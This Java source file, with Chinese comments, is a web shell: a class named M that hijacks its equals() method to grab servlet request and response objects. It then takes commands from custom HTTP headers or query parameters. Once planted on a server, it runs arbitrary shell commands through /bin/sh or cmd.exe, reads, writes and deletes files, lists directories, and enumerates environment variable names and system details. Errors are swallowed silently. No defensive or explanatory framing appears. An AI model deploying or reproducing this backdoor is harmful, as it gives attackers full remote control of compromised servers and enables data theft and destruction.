import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;
import java.util.Properties;

public class M {
    private Object request;
    private Object response;
    private Object session;

    @Override
    public boolean equals(Object obj) {
        try {
            fillContext(obj);
            if (this.response == null || this.request == null) return false;

            HttpServletRequest req = (HttpServletRequest) this.request;
            HttpServletResponse res = (HttpServletResponse) this.response;

            res.setCharacterEncoding("UTF-8");

            String action = getParam(req, "a");
            if (action == null || action.length() == 0) {
                action = "ping";
            }

            String out;
            if ("ping".equals(action)) {
                out = "MATRIX_JSP_PING";
            } else if ("exec".equals(action)) {
                out = handleExec(req);
            } else if ("pwd".equals(action)) {
                out = handlePwd();
            } else if ("ls".equals(action)) {
                out = handleLs(req);
            } else if ("cat".equals(action)) {
                out = handleCat(req);
            } else if ("write".equals(action)) {
                out = handleWrite(req);
            } else if ("rm".equals(action)) {
                out = handleRm(req);
            } else if ("home".equals(action)) {
                out = handleHome();
            } else if ("envnames".equals(action)) {
                out = handleEnvNames();
            } else if ("sysinfo".equals(action)) {
                out = handleSysInfo();
            } else {
                out = "[Error] Unknown action: " + action;
            }

            res.setStatus(200);
            res.setHeader("X-M-Status", "active");
            try {
                // 优先使用 OutputStream 确保二进制兼容
                res.getOutputStream().write(out.getBytes("UTF-8"));
                res.getOutputStream().flush();
                res.getOutputStream().close();
            } catch (Exception e) {
                res.getWriter().print(out);
                res.getWriter().flush();
            }
        } catch (Throwable t) {
            // 静默失败
        }
        return true;
    }

    private void fillContext(Object obj) {
        try {
            if (obj.getClass().getName().indexOf("PageContext") >= 0) {
                this.request = obj.getClass().getMethod("getRequest").invoke(obj);
                this.response = obj.getClass().getMethod("getResponse").invoke(obj);
                this.session = obj.getClass().getMethod("getSession").invoke(obj);
            } else if (obj instanceof Map) {
                Map<String, Object> objMap = (Map<String, Object>) obj;
                this.request = objMap.get("request");
                this.response = objMap.get("response");
                this.session = objMap.get("session");
            } else if (obj instanceof Object[]) {
                Object[] ctx = (Object[]) obj;
                this.request = ctx[0];
                this.response = ctx[1];
            } else if (obj instanceof HttpServletRequest) {
                this.request = obj;
                try {
                    this.response = obj.getClass().getMethod("getResponse").invoke(obj);
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private static String getParam(HttpServletRequest req, String name) {
        if ("a".equals(name)) { String v = req.getHeader("X-A"); if (v != null) return v; }
        if ("_k".equals(name)) { String v = req.getHeader("X-K"); if (v != null) return v; }
        if ("path".equals(name)) { String v = req.getHeader("X-Path"); if (v != null) return v; }
        if ("data".equals(name)) { String v = req.getHeader("X-Data"); if (v != null) return v; }
        String k = req.getHeader("X-K");
        if (k != null && k.equals(name)) { String v = req.getHeader("X-V"); if (v != null) return v; }
        
        // 尝试从 QueryString 获取 (fallback)
        try {
            String qs = req.getQueryString();
            if (qs != null && !qs.isEmpty()) {
                for (String pair : qs.split("&")) {
                    int eq = pair.indexOf('=');
                    if (eq > 0) {
                        String key = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
                        if (name.equals(key)) return URLDecoder.decode(pair.substring(eq + 1), "UTF-8");
                    }
                }
            }
        } catch (Exception ignored) {}
        return req.getParameter(name);
    }

    private String handleExec(HttpServletRequest req) {
        try {
            String key = getParam(req, "_k");
            if (key == null || key.isEmpty()) key = "ecmd";
            String cmd = getParam(req, key);
            if (cmd == null) cmd = "";
            String os = System.getProperty("os.name").toLowerCase();
            String[] commands = os.contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
            Process p = Runtime.getRuntime().exec(commands);
            return readStream(p.getInputStream()) + readStream(p.getErrorStream());
        } catch (Throwable t) {
            return "[EXEC ERROR]\n" + t.getMessage();
        }
    }

    private String handlePwd() throws IOException {
        return new File(".").getCanonicalPath();
    }

    private String handleLs(HttpServletRequest req) {
        String path = getParam(req, "path");
        if (path == null || path.length() == 0) path = ".";
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) return "ERR_OPEN";
        StringBuilder sb = new StringBuilder();
        File[] files = dir.listFiles();
        if (files != null) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
            for (File f : files) {
                String name = f.getName();
                String type = f.isDirectory() ? "d" : "f";
                long size = f.isFile() ? f.length() : 0L;
                String perms = (f.canRead() ? "r" : "-") + (f.canWrite() ? "w" : "-") + (f.canExecute() ? "x" : "-");
                String modified = sdf.format(new Date(f.lastModified()));
                sb.append(b64(name)).append("|").append(type).append("|").append(size).append("|").append(perms).append("|").append(modified).append("\n");
            }
        }
        return sb.toString();
    }

    private String handleCat(HttpServletRequest req) throws IOException {
        String path = getParam(req, "path");
        File f = new File(path);
        if (!f.exists() || !f.isFile()) return "[文件不存在或无权读取]";
        return readStream(new FileInputStream(f));
    }

    private String handleWrite(HttpServletRequest req) throws IOException {
        String path = getParam(req, "path");
        String data = getParam(req, "data");
        if (path == null || data == null) return "0";
        byte[] bytes = b64Decode(data);
        FileOutputStream fos = new FileOutputStream(new File(path));
        fos.write(bytes);
        fos.flush();
        fos.close();
        return "1";
    }

    private String handleRm(HttpServletRequest req) {
        String path = getParam(req, "path");
        if (path == null) return "0";
        return new File(path).delete() ? "1" : "0";
    }

    private String handleHome() {
        return System.getProperty("user.home");
    }

    private String handleEnvNames() {
        StringBuilder sb = new StringBuilder();
        for (Object key : System.getenv().keySet()) sb.append(key).append("\n");
        return sb.toString();
    }

    private String handleSysInfo() {
        StringBuilder sb = new StringBuilder();
        Properties props = System.getProperties();
        appendInfo(sb, "OS", props.getProperty("os.name") + " " + props.getProperty("os.version"));
        appendInfo(sb, "Java版本", props.getProperty("java.version"));
        appendInfo(sb, "用户", props.getProperty("user.name"));
        appendInfo(sb, "当前目录", props.getProperty("user.dir"));
        appendInfo(sb, "文件编码", props.getProperty("file.encoding"));
        return sb.toString();
    }

    private void appendInfo(StringBuilder sb, String key, String value) {
        sb.append(b64(key)).append("|").append(b64(value)).append("\n");
    }

    private String readStream(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = in.read(buf)) != -1) bos.write(buf, 0, len);
        return new String(bos.toByteArray(), "UTF-8");
    }

    private String b64(String s) {
        try {
            Class<?> b64Class = Class.forName("java.util.Base64");
            Object encoder = b64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, s.getBytes("UTF-8"));
        } catch (Throwable t) {
            try {
                Class<?> b64Class = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = b64Class.newInstance();
                return ((String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, s.getBytes("UTF-8"))).replaceAll("\n", "").replaceAll("\r", "");
            } catch (Throwable t2) { return ""; }
        }
    }

    private byte[] b64Decode(String s) {
        try {
            Class<?> b64Class = Class.forName("java.util.Base64");
            Object decoder = b64Class.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, s);
        } catch (Throwable t) {
            try {
                Class<?> b64Class = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = b64Class.newInstance();
                return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, s);
            } catch (Throwable t2) { return new byte[0]; }
        }
    }
}
